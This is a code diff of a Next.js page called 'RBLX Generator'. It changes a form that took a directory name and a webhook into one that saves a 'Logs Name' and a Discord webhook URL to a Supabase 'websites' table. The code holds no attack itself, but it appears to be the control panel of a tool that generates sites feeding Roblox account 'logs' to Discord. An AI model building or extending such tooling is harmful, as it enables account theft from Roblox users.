@@ -1,76 +1,90 @@
-'use client';
-import { useState } from 'react';
+"use client";
+import { useState } from "react";
+import { createClient } from "@supabase/supabase-js";
+
+const supabase = createClient(
+  process.env.NEXT_PUBLIC_SUPABASE_URL,
+  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
+);
 
 export default function Home() {
-  const [directory, setDirectory] = useState('');
-  const [webhook, setWebhook] = useState('');
-  const [message, setMessage] = useState('');
+  const [name, setName] = useState("");
+  const [webhook, setWebhook] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState("");
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setLoading(true);
+    setMessage("");
 
-    if (!directory || !webhook) {
-      setMessage('⚠️ Please fill in all fields.');
+    if (!name || !webhook) {
+      setMessage("⚠ Please fill out both fields!");
+      setLoading(false);
       return;
     }
 
-    setMessage('⏳ Generating... Please wait.');
+    const { error } = await supabase.from("websites").insert([
+      { name: name, webhook: webhook, url: webhook },
+    ]);
 
-    try {
-      const res = await fetch('/api/create', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ directory, webhook }),
-      });
-
-      const data = await res.json();
-
-      if (data.success) {
-        setMessage('✅ Created successfully!');
-      } else {
-        setMessage(`❌ Error: ${data.error || 'Something went wrong.'}`);
-      }
-    } catch (err) {
-      console.error(err);
-      setMessage('🚫 Failed to connect to the server.');
+    if (error) {
+      console.error(error);
+      setMessage("❌ Failed to save: " + error.message);
+    } else {
+      setMessage("✅ Saved successfully to Supabase!");
+      setName("");
+      setWebhook("");
     }
+
+    setLoading(false);
   };
 
   return (
-    <main className="flex min-h-screen flex-col items-center justify-center bg-gray-900 text-white p-6">
-      <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>
+    <main className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white p-6">
+      <div className="max-w-md w-full bg-gray-900/70 backdrop-blur-xl rounded-2xl p-6 shadow-lg border border-gray-700">
+        <h1 className="text-3xl font-bold mb-6 text-center">
+          ⚙️ RBLX Generator
+        </h1>
 
-      <form
-        onSubmit={handleSubmit}
-        className="flex flex-col gap-4 w-full max-w-sm bg-gray-800 p-6 rounded-2xl shadow-lg"
-      >
-        <input
-          type="text"
-          placeholder="Enter directory name"
-          value={directory}
-          onChange={(e) => setDirectory(e.target.value)}
-          className="p-3 rounded-lg text-black"
-        />
+        <form onSubmit={handleSubmit} className="space-y-4">
+          <div>
+            <label className="block text-sm mb-2 font-medium">Logs Name</label>
+            <input
+              type="text"
+              value={name}
+              onChange={(e) => setName(e.target.value)}
+              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
+              placeholder="logs"
+            />
+          </div>
 
-        <input
-          type="text"
-          placeholder="Enter webhook URL"
-          value={webhook}
-          onChange={(e) => setWebhook(e.target.value)}
-          className="p-3 rounded-lg text-black"
-        />
+          <div>
+            <label className="block text-sm mb-2 font-medium">
+              Discord Webhook URL
+            </label>
+            <input
+              type="url"
+              value={webhook}
+              onChange={(e) => setWebhook(e.target.value)}
+              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
+              placeholder="https://discord.com/api/webhooks/..."
+            />
+          </div>
 
-        <button
-          type="submit"
-          className="bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
-        >
-          Generate
-        </button>
-      </form>
+          <button
+            type="submit"
+            disabled={loading}
+            className="w-full py-2 mt-4 bg-indigo-600 hover:bg-indigo-700 rounded-lg font-semibold transition"
+          >
+            {loading ? "Saving..." : "🚀 Generate"}
+          </button>
+        </form>
 
-      {message && (
-        <p className="mt-4 text-sm text-gray-300 text-center">{message}</p>
-      )}
+        {message && (
+          <p className="mt-4 text-center text-sm text-gray-300">{message}</p>
+        )}
+      </div>
     </main>
   );
-            }
+}
